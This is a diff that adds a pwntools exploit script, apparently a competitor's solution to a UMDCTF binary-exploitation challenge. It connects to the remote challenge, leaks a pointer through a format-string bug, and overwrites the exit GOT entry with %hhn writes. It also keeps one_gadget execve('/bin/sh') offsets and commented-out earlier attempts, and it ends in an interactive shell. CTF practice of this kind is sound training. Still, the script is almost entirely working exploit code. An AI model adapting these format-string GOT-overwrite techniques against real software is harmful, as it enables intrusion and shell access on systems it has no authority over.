@@ -1,0 +1,106 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+context.terminal = ["tilix","-a","session-add-right","-e"]
+
+
+exe = context.binary = ELF('./chall')
+
+host = args.HOST or 'chals5.umdctf.io'
+port = int(args.PORT or 7004)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+gdbscript = '''
+b *main
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
+
+def kekw(payload):
+    io.sendlineafter("> ", payload, timeout=1)
+
+io = start()
+padding = b"A"*272
+
+# kekw(padding + f"%2$p") #_IO_stdfile_1_lock
+# io.recvuntil("Current location: ")
+# leak = int(io.recvline().strip(b"\n").decode('utf-8'), 16)
+# print(hex(leak))
+# heap_base = leak - 0x8c0
+# print(hex(heap_base))
+# kekw(padding + f"%1$nBBBBBBBB") #_IO_stdfile_1_lock
+# io.recvuntil("Current location: ")
+# print(io.recvline())
+#%48879c%15$hn%8126c%16$hnaaap@@\x00r@@\x00
+# payload = flat([
+
+#     padding,
+#     b"AAA%17$n",
+#     p64(exe.got['exit'])
+
+# ])
+payload = flat([
+
+    padding,
+    b"AAAA%108c%18$hhn",
+#   b"AA%48607c%18$hhn",
+    p64(exe.got['exit'])
+
+])
+
+# kekw(padding + f"BBBBBBBB%16$n")
+kekw(padding + b"%8$p") #_IO_stdfile_1_lock
+io.recvuntil("Current location: ")
+leak = int(io.recvline().strip(b"\n").decode('utf-8'), 16)
+heap_base = leak - 0x260
+kekw(payload)
+
+payload = flat([
+
+    padding,
+    b"AAAAA%16c%18$hhn",
+#   b"AA%48607c%18$hhn",
+    p64(exe.got['exit'] + 1)
+
+])
+kekw(payload)
+
+io.interactive()
+
+"""
+0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f432 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a41c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+"""
+print(fmtstr_payload(offset=17, numbwritten=272,writes={exe.got['exit']: 0xdeadbeef}, write_size='short'))
